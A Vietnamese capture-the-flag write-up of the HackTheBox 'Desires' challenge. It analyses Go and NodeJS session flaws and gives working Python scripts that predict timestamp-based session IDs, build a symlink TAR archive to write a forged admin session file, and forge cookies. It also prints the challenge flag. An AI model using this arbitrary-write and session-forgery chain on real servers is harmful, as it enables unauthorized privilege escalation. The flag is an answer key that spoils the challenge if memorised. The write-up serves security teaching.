# Phân tích chi tiết bài Desires – HackTheBox

## Link bài lab

**[Desires](https://app.hackthebox.com/challenges/Desires)**

---

## Phân tích NodeJS Express (`index.js`)

NodeJS đóng vai trò **internal API** — Golang gọi vào đây để xác thực credentials và quản lý user. Client bên ngoài không thể truy cập trực tiếp.

### `/register`

```javascript
app.post("/register", (req, res) => {
  const { username, password } = req.body;

  // Kiểm tra username đã tồn tại chưa
  db.get("SELECT * FROM users WHERE username = ?", [username], (err, row) => {
    if (row) {
      return res.status(400).json({ error: "Username already exists" });
    }

    bcrypt.hash(password, 10, (err, hash) => {
      db.run(
        "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
        [username, hash, "user"],  // ← role luôn là "user", hardcoded
        ...
      );
    });
  });
});
```

**Điểm quan trọng:** `role` bị hardcode thành `"user"` trong SQL INSERT. Không có cách nào đăng ký tài khoản admin hợp lệ qua endpoint này.

### `/login`

```javascript
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  db.get("SELECT * FROM users WHERE username = ?", [username], (err, row) => {
    if (!row) {
      return res.status(400).json({ error: "Invalid username or password" });
    }

    bcrypt.compare(password, row.password, (err, result) => {
      if (!result) {
        return res.status(400).json({ error: "Invalid username or password" });
      }

      // Trả về user object bao gồm role từ database
      return res.status(200).json({
        username: row.username,
        id:       row.id,
        role:     row.role,
      });
    });
  });
});
```

NodeJS trả về `role` từ database — luôn là `"user"` vì `/register` hardcode như vậy. Không có đường hợp lệ nào để có `role: "admin"` từ NodeJS.

### Database

```javascript
const db = new sqlite3.Database(":memory:", ...)
```

Database là **in-memory** — mỗi lần restart server thì toàn bộ dữ liệu mất. Không có persistence.

---

## Phân tích Golang Fiber

### `RegisterHandler`

```go
func RegisterHandler(c *fiber.Ctx) error {
    var credentials Credentials
    if err := c.BodyParser(&credentials); err != nil { ... }

    // Lọc ký tự nguy hiểm trong username
    if strings.ContainsAny(credentials.Username, "/.\\") {
        return utils.ErrorResponse(c, "Invalid Username", http.StatusBadRequest)
    }

    // Gọi NodeJS /register
    if err := registerUser(credentials.Username, credentials.Password); err != nil { ... }
    return c.Redirect("/")
}
```

Username bị lọc `/`, `.`, `\` để ngăn path traversal **trực tiếp qua username**. Không ảnh hưởng đến attack vector symlink.

---

### `LoginHandler` — Lỗ hổng cốt lõi

```go
func LoginHandler(c *fiber.Ctx) error {
    var credentials Credentials
    if err := c.BodyParser(&credentials); err != nil { ... }

    // ❶ SessionID chỉ từ timestamp — không secret, không entropy
    sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(
        strconv.FormatInt(time.Now().Unix(), 10),
    )))

    // ❷ Ghi Redis TRƯỚC khi xác thực credentials
    err := PrepareSession(sessionID, credentials.Username)
    if err != nil { ... }

    // ❸ Xác thực mới chạy sau — nếu sai thì return lỗi
    //    nhưng Redis đã bị ghi từ ❷ rồi!
    user, err := loginUser(credentials.Username, credentials.Password)
    if err != nil {
        return utils.ErrorResponse(c, "Invalid username or Password", ...)
    }

    // ❹ Tạo file session JSON tại /tmp/sessions/{username}/{sessionID}
    sessId := CreateSession(sessionID, user)

    c.Cookie(&fiber.Cookie{Name: "session",  Value: sessId, ...})
    c.Cookie(&fiber.Cookie{Name: "username", Value: credentials.Username, ...})
    return c.Redirect("/user/upload")
}
```

**Hai lỗi logic tại đây:**

| # | Lỗi | Hệ quả |
|---|-----|--------|
| ❶ | `sha256(unix_timestamp)` — không có secret key | SessionID đoán được qua HTTP header `Date` |
| ❷ | `PrepareSession` chạy trước `loginUser` | Redis nhận mapping dù credentials sai hoàn toàn |

---

### `session.go` — Quản lý session

#### `PrepareSession`

```go
func PrepareSession(sessionID string, username string) error {
    // Ghi username → sessionID vào Redis
    // Được gọi TRƯỚC khi xác thực — đây là lỗi thiết kế
    return utils.RedisClient.Set(username, sessionID, 0)
}
```

#### `CreateSession`

```go
func CreateSession(sessionID string, user *User) string {
    sessionJSON, _ := json.Marshal(user)

    folderPath := filepath.Join("/tmp/sessions/", user.Username)
    os.MkdirAll(folderPath, 0755)

    // Ghi file: /tmp/sessions/{username}/{sessionID}
    sessionFilePath := filepath.Join(folderPath, sessionID)
    os.WriteFile(sessionFilePath, sessionJSON, 0644)

    return sessionID
}
```

File session có nội dung:

```json
{"username": "user", "id": 1, "role": "user"}
```

#### `GetSession`

```go
func GetSession(username string) (*User, error) {
    // Tra Redis lấy sessionID theo username
    sessionID, err := utils.RedisClient.Get(username)

    // Đọc file session từ disk
    sessionJSON, err := os.ReadFile(
        filepath.Join("/tmp/sessions", username, sessionID),
    )

    // Deserialize JSON → struct User
    var session User
    json.Unmarshal(sessionJSON, &session)
    return &session, nil
}
```

**Quan sát quan trọng:** `GetSession` không nhận sessionID từ cookie client — nó tự tra Redis theo username. Cookie `session` từ client hoàn toàn không tham gia vào quá trình này.

---

### `SessionMiddleware` — Lỗ hổng xác thực danh tính

```go
func SessionMiddleware(c *fiber.Ctx) error {
    sessionID := c.Cookies("session")   // ← lấy ra nhưng KHÔNG dùng để verify
    username  := c.Cookies("username")  // ← đây mới là thứ quyết định danh tính

    // Chỉ kiểm tra không rỗng
    if sessionID == "" || username == "" {
        return c.SendStatus(http.StatusUnauthorized)
    }

    // Toàn bộ identity đến từ cookie username do CLIENT gửi lên
    session, err := GetSession(username)

    c.Locals("user", *session)
    return c.Next()
}
```

**Đây là lỗi nghiêm trọng nhất:** Server tin tưởng hoàn toàn vào cookie `username` do client gửi lên để xác định danh tính. Cookie `session` chỉ được kiểm tra "không rỗng" rồi bỏ qua — giá trị `"dummy"` hoàn toàn hoạt động.

---

### `UploadEnigma` — Điểm ZipSlip

```go
func UploadEnigma(c *fiber.Ctx) error {
    userStruct, ok := user.(User)

    // Tên file bị thay bằng UUID → không path traversal qua filename
    filename := uuid.New().String() + filepath.Ext(file.Filename)
    tempFile := filepath.Join("./uploads", filename)
    c.SaveFile(file, tempFile)

    // Giải nén vào ./files/{username}/
    userFolder := filepath.Join("./files", userStruct.Username)
    os.MkdirAll(userFolder, 0755)

    // ← ĐIỂM NGUY HIỂM: không kiểm tra symlink bên trong archive
    err = archiver.Unarchive(tempFile, userFolder)
}
```

---

### `DesireIsEnigma` — Mục tiêu cuối

```go
func DesireIsEnigma(c *fiber.Ctx) error {
    userStruct, ok := user.(User)

    // Role lấy hoàn toàn từ file session đã deserialize
    if userStruct.Role == "admin" {
        return c.Render("admin", fiber.Map{"FLAG": os.Getenv("FLAG")})
    }
    return utils.ErrorResponse(c, "You are not admin !", http.StatusForbidden)
}
```

---

## Phân tích lỗ hổng

### Lỗ hổng 1: ZipSlip qua Symbolic Link trong TAR archive

#### Tại sao ZipSlip thông thường không hoạt động

Thư viện `archiver` của Go chặn path traversal kiểu `../../file`:

```
[ERROR] checking path traversal attempt: illegal file path: ../../static/test.txt
```

Tuy nhiên `err` trả về `nil` — server không phát hiện ra, nghĩ giải nén thành công.

#### Bypass bằng Symbolic Link trong TAR

```
Bước 1: Tạo symlink "tmp_link" → "/tmp/sessions"
Bước 2: Thêm file vào archive với đường dẫn "tmp_link/{username}/{sessionID}"
Bước 3: Khi giải nén:
         - symlink "tmp_link" được tạo tại ./files/{uploader}/tmp_link
         - "tmp_link/noexist/{sessionID}" resolve qua symlink
         → thực chất ghi vào /tmp/sessions/noexist/{sessionID}
```

```python
# Minh họa tạo archive
from tarfile import TarFile
import subprocess

subprocess.run(["ln", "-s", "/tmp/sessions", "tmp_link"])

with TarFile("payload.tar", "w") as tarf:
    tarf.add("tmp_link")                              # symlink
    tarf.add("data.txt", "tmp_link/noexist/SESSION")  # file đích
```

> **Lý do dùng TAR thay ZIP:** Module `tarfile` của Python giữ nguyên symlink khi archive. Module `zipfile` resolve symlink thành file thực trước khi thêm vào.

---

### Lỗ hổng 2: SessionID có thể đoán được

```go
sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(
    strconv.FormatInt(time.Now().Unix(), 10),
)))
```

- Chỉ phụ thuộc vào `unix_timestamp` — không có secret key, không có nonce
- Unix timestamp suy ra được từ header `Date` trong HTTP response
- `PrepareSession` gọi **trước** khi xác thực → chỉ cần gửi login với username bất kỳ là trigger được

#### Đoán sessionID

```python
import requests, hashlib
from datetime import datetime, timezone

MONTHS = ["Jan","Feb","Mar","Apr","May","Jun",
          "Jul","Aug","Sep","Oct","Nov","Dec"]

resp = requests.post(f"{BASE_URL}/login",
                     {"username": "noexist", "password": "wrong"})

parts   = resp.headers["Date"].split(",")[1].split()
day, mon, year, time_str = parts[0], parts[1], parts[2], parts[3]
h, m, s = time_str.split(":")
mon_num = MONTHS.index(mon.capitalize()) + 1

dt    = datetime(int(year), mon_num, int(day), int(h), int(m), int(s),
                 tzinfo=timezone.utc)
posix = int(dt.timestamp())

# Đoán 3 giá trị để bù độ trễ mạng
sid_before = hashlib.sha256(str(posix - 1).encode()).hexdigest()
sid_exact  = hashlib.sha256(str(posix    ).encode()).hexdigest()
sid_after  = hashlib.sha256(str(posix + 1).encode()).hexdigest()
```

---

### Lỗ hổng 3: Username Cookie Trust

```go
// SessionMiddleware
username := c.Cookies("username")  // ← lấy từ client không qua verify
session, err := GetSession(username)
c.Locals("user", *session)
```

Server dùng cookie `username` do **client tự gửi lên** để quyết định đọc file session của ai. Không có bước nào verify rằng cookie `username` có khớp với session hợp lệ hay không.

Kết hợp với ZipSlip, attacker có thể:
1. Ghi file session giả cho username `"noexist"`
2. Gửi request với cookie `username=noexist`
3. Server đọc file session giả → nhận role `"admin"`

---

### Lỗ hổng 4: Session File Forgery → Privilege Escalation

Đây là mắt xích cuối giải thích tại sao privilege escalation thành công.

Khi `GetSession` đọc file session:

```go
sessionJSON, err := os.ReadFile(
    filepath.Join("/tmp/sessions", username, sessionID),
)

var session User
json.Unmarshal(sessionJSON, &session)
return &session, nil
```

File JSON được deserialize **trực tiếp** thành struct `User`:

```go
type User struct {
    Username string `json:"username"`
    ID       int    `json:"id"`
    Role     string `json:"role"`
}
```

Nếu file session chứa:

```json
{"username": "noexist", "id": 1337, "role": "admin"}
```

thì `json.Unmarshal` tạo ra:

```go
User{
    Username: "noexist",
    ID:       1337,
    Role:     "admin",  // ← role đến hoàn toàn từ file JSON
}
```

Sau đó middleware gán:

```go
c.Locals("user", *session)
```

Và endpoint admin kiểm tra:

```go
if userStruct.Role == "admin" { ... }  // ← TRUE
```

**Không có bước nào verify role với database.** Role được tin tưởng hoàn toàn từ nội dung file session trên disk — file mà attacker đã ghi qua ZipSlip.

---

## Chain attack

```
❶ PrepareSession chạy trước loginUser
    → Redis nhận "noexist" → sessionID dù login sai

❷ sha256(timestamp) đoán được từ Date header
    → Biết trước sessionID đã lưu trong Redis

❸ ZipSlip qua symlink trong TAR
    → Ghi file JSON giả vào /tmp/sessions/noexist/{sessionID}
       nội dung: {"username":"noexist","id":1337,"role":"admin"}

❹ Username Cookie Trust
    → Gửi cookie username="noexist", session="dummy"
    → Server đọc file giả, deserialize thành User{Role:"admin"}

❺ Role không verify với database
    → userStruct.Role == "admin" → TRUE → FLAG
```

---

## Các bước khai thác

### Bước 1 & 2: Trigger PrepareSession và leak sessionID

```python
# get_session_id.py
import requests, hashlib
from datetime import datetime, timezone

BASE_URL = "http://TARGET"
USERNAME = "noexist"
MONTHS   = ["Jan","Feb","Mar","Apr","May","Jun",
            "Jul","Aug","Sep","Oct","Nov","Dec"]

# Gửi login sai → trigger PrepareSession ghi Redis
resp = requests.post(f"{BASE_URL}/login",
                     {"username": USERNAME, "password": "wrong"})

# Parse header Date để tính timestamp
parts    = resp.headers["Date"].split(",")[1].split()
day, mon, year, time_str = parts[0], parts[1], parts[2], parts[3]
h, m, s  = time_str.split(":")
mon_num  = MONTHS.index(mon.capitalize()) + 1

dt    = datetime(int(year), mon_num, int(day), int(h), int(m), int(s),
                 tzinfo=timezone.utc)
posix = int(dt.timestamp())

sid_before = hashlib.sha256(str(posix - 1).encode()).hexdigest()
sid_exact  = hashlib.sha256(str(posix    ).encode()).hexdigest()
sid_after  = hashlib.sha256(str(posix + 1).encode()).hexdigest()

print(f"Before: {sid_before}")
print(f"Exact:  {sid_exact}")
print(f"After:  {sid_after}")
```

**Sau bước này:** Redis có `"noexist" → sessionID` và ta biết 3 sessionID có thể.

---

### Bước 3: Tạo TAR archive chứa file session giả

```python
# create_malicious_tar.py
from tarfile import TarFile
import subprocess, json

USERNAME     = "noexist"
SESSION_ID_1 = "..."  # sid_before
SESSION_ID_2 = "..."  # sid_exact
SESSION_ID_3 = "..."  # sid_after

# Tạo symlink trỏ vào /tmp/sessions
subprocess.run(["ln", "-s", "/tmp/sessions", "tmp_link"])

# File session giả với role admin
data = json.dumps({"username": USERNAME, "id": 1337, "role": "admin"})
with open("malicious_data.txt", "w") as f:
    f.write(data)

with TarFile("payload.tar", "w") as tarf:
    tarf.add("tmp_link")
    tarf.add("malicious_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_1}")
    tarf.add("malicious_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_2}")
    tarf.add("malicious_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_3}")
```

**Cấu trúc archive:**

```
payload.tar
├── tmp_link                           → symlink → /tmp/sessions
├── tmp_link/noexist/{sid_before}      → {"role":"admin",...}
├── tmp_link/noexist/{sid_exact}       → {"role":"admin",...}
└── tmp_link/noexist/{sid_after}       → {"role":"admin",...}
```

---

### Bước 4 & 5: Upload bằng tài khoản khác

Dùng tài khoản **khác** (`normal`) để upload, tránh conflict với username mục tiêu:

```python
# upload_malicious_tar.py
import requests

BASE_URL     = "http://TARGET"
UPLOAD_USER  = "normal"
UPLOAD_PASS  = "normal"

session = requests.Session()
session.post(f"{BASE_URL}/register", {"username": UPLOAD_USER, "password": UPLOAD_PASS})
session.post(f"{BASE_URL}/login",    {"username": UPLOAD_USER, "password": UPLOAD_PASS})
session.post(f"{BASE_URL}/user/upload",
             files={"archive": open("payload.tar", "rb")})
```

**Điều xảy ra trên server khi giải nén:**

```
Giải nén vào: ./files/normal/
    ├── tmp_link  ← symlink tạo tại ./files/normal/tmp_link → /tmp/sessions
    └── tmp_link/noexist/{sessionID}
            ↓ symlink resolve
        /tmp/sessions/noexist/{sessionID}  ← file giả được ghi vào đây
```

---

### Bước 6: Truy cập admin

```python
# KO.py
import requests

BASE_URL = "http://TARGET"

resp = requests.get(
    f"{BASE_URL}/user/admin",
    cookies={
        "username": "noexist",
        "session":  "dummy",   # bất kỳ giá trị nào, miễn không rỗng
    }
)

flag_start = resp.text.find("HTB{")
flag_end   = resp.text.find("}", flag_start)
print(resp.text[flag_start:flag_end+1])
```

**Luồng xác thực đầy đủ khi request đến:**

```
1. SessionMiddleware:
   - sessionID = "dummy"       ← không rỗng → pass
   - username  = "noexist"     ← không rỗng → pass

2. GetSession("noexist"):
   a. Redis.Get("noexist")
      → trả về sessionID thực (đã ghi ở Bước 1)
   b. os.ReadFile("/tmp/sessions/noexist/{sessionID}")
      → đọc file GIẢ: {"username":"noexist","id":1337,"role":"admin"}
   c. json.Unmarshal → User{Role:"admin"}

3. c.Locals("user", User{Role:"admin"})

4. DesireIsEnigma:
   userStruct.Role == "admin"  → TRUE → FLAG
```

---

## Root cause

| # | Nguyên nhân | Vị trí | Hệ quả |
|---|-------------|--------|--------|
| 1 | `PrepareSession` chạy trước `loginUser` | `LoginHandler` – `http.go` | Attacker kiểm soát Redis mapping với username tùy ý |
| 2 | SessionID = `sha256(unix_timestamp)` không có secret | `LoginHandler` – `http.go` | SessionID đoán được từ HTTP `Date` header |
| 3 | `archiver.Unarchive` không chặn symlink | `UploadEnigma` – `http.go` | Ghi file tùy ý lên server qua symlink trong TAR |
| 4 | Server tin tưởng cookie `username` từ client | `SessionMiddleware` – `http.go` | Toàn bộ identity do client kiểm soát |
| 5 | Role không verify với database | `GetSession` + `DesireIsEnigma` | Privilege escalation từ nội dung file JSON giả |

---

## Flag

```
HTB{S0m3tIm3s_Its_J4usT_A_B!G_M3ss}
```
